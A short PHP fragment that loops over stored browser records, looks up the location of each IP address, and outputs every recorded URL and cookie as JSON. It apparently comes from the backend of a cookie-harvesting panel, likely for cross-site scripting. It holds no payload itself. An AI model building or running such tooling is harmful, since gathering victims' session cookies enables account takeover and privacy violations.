<?php

			 if(is_array($browsers)){
	
			   
			   foreach($browsers  as  $browser){
		  
		  $utime=date("Y-m-d H:i:s",$browser['dateline']);
                    load_func("IptoAddr");
		   $addr=ip_to_addr($browser['ip']);
    			$info=new InfoModel($browser['bid']);

       $info=$info->get();
         
         // $invitecount = 0;   
                             if ($info['cookie']){
   $arr[]= array("url"=>$info['url'], "cookie"=>$info['cookie']);
                             }

			   }
                           //记录当前下线的下线数量 
 
				 
			 }
				
//$arr4 = array(array("url"=>$info['url'], "cookie"=>$info['cookie']));

echo json_encode($arr);
			
			?>
